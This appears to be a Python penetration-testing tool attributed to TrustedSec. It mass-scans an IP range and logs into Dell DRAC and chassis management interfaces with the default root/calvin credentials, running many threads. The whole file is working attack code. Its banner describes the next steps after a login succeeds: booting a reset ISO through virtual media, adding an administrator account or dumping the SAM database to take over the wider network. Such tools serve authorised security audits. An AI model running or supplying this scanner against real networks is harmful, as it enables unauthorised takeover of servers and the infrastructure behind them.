#!/usr/bin/env python
# coding=utf-8

###########################################
#
# Dell DRAC and Chassis Scanner
# Default Credential Check
# UN: root PW: calvin
#
# Written by Dave Kennedy (ReL1K)
# Company: TrustedSec, LLC
# Website: https://www.trustedsec.com
# @TrustedSec
#
##########################################
import re
import threading
import time

try:  # Py2
    from urllib import urlencode, urlopen
except ImportError:  # Py3
    from urllib.request import urlopen
    from urllib.parse import urlencode

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass


class bcolors(object):
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERL = '\033[4m'
    ENDC = '\033[0m'
    backBlack = '\033[40m'
    backRed = '\033[41m'
    backGreen = '\033[42m'
    backYellow = '\033[43m'
    backBlue = '\033[44m'
    backMagenta = '\033[45m'
    backCyan = '\033[46m'
    backWhite = '\033[47m'

    def disable(self):
        self.PURPLE = ''
        self.CYAN = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''
        self.BOLD = ''
        self.UNDERL = ''
        self.backBlack = ''
        self.backRed = ''
        self.backGreen = ''
        self.backYellow = ''
        self.backBlue = ''
        self.backMagenta = ''
        self.backCyan = ''
        self.backWhite = ''
        self.DARKCYAN = ''


# try logging into DRAC, chassis is something different


def login_drac(ipaddr_single):
    # default post string
    url = "https://{0}/Applications/dellUI/RPC/WEBSES/create.asp".format(ipaddr_single)
    # post parameters
    opts = {"WEBVAR_PASSWORD": "calvin",
            "WEBVAR_USERNAME": "root",
            "WEBVAR_ISCMCLOGIN": 0}
    # URL encode it
    data = urlencode(opts)
    # our headers to pass (taken from raw post)
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
               # "Host": "10.245.196.52",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-us,en;q=0.5",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "Referer": "https://{0}/Applications/dellUI/login.htm".format(ipaddr_single),
               "Content-Length": 63,
               "Cookie": "test=1; SessionLang=EN",
               "Pragma": "no-cache",
               "Cache-Control": "no-cache"}
    # request the page
    try:
        # capture the response
        response = urlopen(url, data, headers, timeout=2)
        data = response.read()
        # if we failed our login, just pass through
        if "Failure_Login_IPMI_Then_LDAP" in data:
            pass
        # Failure_No_Free_Slot means there are no sessions available need to
        # log someone off
        if "Failure_No_Free_Slot" in data:
            print(("{0}[!]{1} There are to many people logged but un: root and pw: calvin are legit on IP: {2}".format(bcolors.YELLOW,
                                                                                                                       bcolors.ENDC,
                                                                                                                       ipaddr_single)))
            global global_check1
            global_check1 = 1

        # if we are presented with a username back, we are golden
        if "'USERNAME' : 'root'" in data:
            print("{0}[*]{1} Dell DRAC compromised! username: root and password: calvin for IP address: {2}".format(bcolors.GREEN,
                                                                                                                    bcolors.ENDC,
                                                                                                                    ipaddr_single))
            global global_check2
            global_check2 = 1
    # handle failed attempts and move on
    except:
        pass


# these are for the centralized dell chassis


def login_chassis(ipaddr_single):
    # our post URL
    url = "https://{0}/cgi-bin/webcgi/login".format(ipaddr_single)
    # our post parameters
    opts = {"WEBSERVER_timeout": "1800",
            "user": "root",
            "password": "calvin",
            "WEBSERVER_timeout_select": "1800"}
    # url encode
    data = urlencode(opts)
    # headers (taken from raw POST)
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-us,en;q=0.5",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "Referer": "https://{0}/cgi-bin/webcgi/login".format(ipaddr_single),
               "Content-Length": 78}

    # request the page
    # req = Request(url, data, headers)
    try:
        # capture the response
        response = urlopen(url, data, headers, timeout=2)
        data = response.read()
        # if we failed to login
        if "login_failed_hr_top" in data:
            pass  # login failed
        # to many people logged in at a given time
        if 'Connection refused, maximum sessions already in use.' in data:
            print(("{0}[!]{1} There are to many people logged but un: root and pw: calvin are legit on IP: {2}".format(bcolors.YELLOW,
                                                                                                                    bcolors.ENDC,
                                                                                                                    ipaddr_single)))
            global global_check3
            global_check3 = 1

        # successful guess of passwords
        if "/cgi-bin/webcgi/index" in data:
            print("{0}[*]{1} Dell Chassis Compromised! username: root password: calvin for IP address: {2}".format(bcolors.GREEN,
                                                                                                              bcolors.ENDC,
                                                                                                              ipaddr_single))
            global global_check4
            global_check4 = 1

    # except and move on for failed login attempts
    except:
        pass


# this will check to see if we are using
# a valid IP address for scanning


def is_valid_ip(ip):
    pattern = re.compile(r"""
        ^
        (?:
          # Dotted variants:
          (?:
            # Decimal 1-255 (no leading 0's)
            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          # Decimal notation, 1-4294967295:
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None


# convert to 32 bit binary from standard format

def ip2bin(ip):
    b = ""
    in_quads = ip.split(".")
    out_quads = 4
    for q in in_quads:
        if q != "":
            b += dec2bin(int(q), 8)
            out_quads -= 1
    while out_quads > 0:
        b += "00000000"
        out_quads -= 1
    return b


# decimal to binary conversion
def dec2bin(n, d=None):
    s = ""
    while n > 0:
        if n & 1:
            s = "1" + s
        else:
            s = "0" + s
        n >>= 1
    if d is not None:
        while len(s) < d:
            s = "0" + s
    if s == "":
        s = "0"
    return s


# convert a binary string into an IP address
def bin2ip(b):
    ip = ""
    for i in range(0, len(b), 8):
        ip += str(int(b[i:i + 8], 2)) + "."
    return ip[:-1]


# print a list of IP addresses based on the CIDR block specified
def scan(ipaddr):
    if "/" in ipaddr:
        parts = ipaddr.split("/")
        base_ip = ip2bin(parts[0])
        subnet = int(parts[1])
        if subnet == 32:
            ipaddr = bin2ip(base_ip)
        else:
            # our base ip addresses for how many we are going to be scanning
            counter = 0
            # capture the threads
            threads = []
            ip_prefix = base_ip[:-(32 - subnet)]
            for i in range(2 ** (32 - subnet)):
                ipaddr_single = bin2ip(ip_prefix + dec2bin(i, (32 - subnet)))
                # if we are valid proceed
                ip_check = is_valid_ip(ipaddr_single)
                if ip_check:
                    # do this to limit how fast it can scan, anything more
                    # causes CPU to hose
                    if counter > 255:
                        # put a small delay in place
                        time.sleep(0.1)
                    # increase counter until 255 then delay 0.1
                    counter += 1
                    # start our drac BF
                    thread = threading.Thread(target=login_drac, args=(ipaddr_single,))
                    # create a list of our threads in a dictionary
                    threads.append(thread)
                    # start the thread
                    thread.start()
                    # same as above just on the chassis
                    thread = threading.Thread(target=login_chassis, args=(ipaddr_single,))
                    # append the thread
                    threads.append(thread)
                    # start the thread
                    thread.start()

            # wait for all the threads to terminate
            for thread in threads:
                thread.join()

    # if we are using a single IP address then just do this
    if "/" not in ipaddr:
        login_drac(ipaddr)
        login_chassis(ipaddr)


print("\n")
print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("Fast-Track DellDRAC and Dell Chassis Discovery and Brute Forcer")
print("")
print("Written by Dave Kennedy @ TrustedSec")
print("https://www.trustedsec.com")
print("@TrustedSec and @HackingDave")
print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("")
print("This attack vector can be used to identify default installations")
print("of Dell DRAC and Chassis installations. Once found, you can use")
print("the remote administration capabilties to mount a virtual media")
print("device and use it to load for example Back|Track or password")
print("reset iso. From there, add yourself a local administrator account")
print("or dump the SAM database. This will allow you to compromise the")
print("entire infrastructure. You will need to find a DRAC instance that")
print("has an attached server and reboot it into the iso using the virtual")
print("media device.")
print("")
print("Enter the IP Address or CIDR notation below. Example: 192.168.1.1/24")
print("")
ipaddr = input("Enter the IP or CIDR: ")

print("{0}[*]{1} Scanning IP addresses, this could take a few minutes depending on how large the subnet range...".format(bcolors.GREEN,
                                                                                                                         bcolors.ENDC))
print("{0}[*]{1} Asan example, a /16 can take an hour or two.. A slash 24 is only a couple seconds. Be patient.".format(bcolors.GREEN,
                                                                                                                        bcolors.ENDC))

# set global variables to see if we were successful
global_check1 = 0
global_check2 = 0
global_check3 = 0
global_check4 = 0

# kick off the scan
scan(ipaddr)
if any([global_check1, global_check2, global_check3, global_check4]):
    print(("{0}[*]{1} DellDrac / Chassis Brute Forcer has finished scanning. Happy Hunting =)".format(bcolors.GREEN,
                                                                                                      bcolors.ENDC)))
else:
    print(("{0}[!]{1} Sorry, unable to find any of the Dell servers with default creds..Good luck :(".format(bcolors.RED,
                                                                                                             bcolors.ENDC)))

input("Press {return} to exit.")
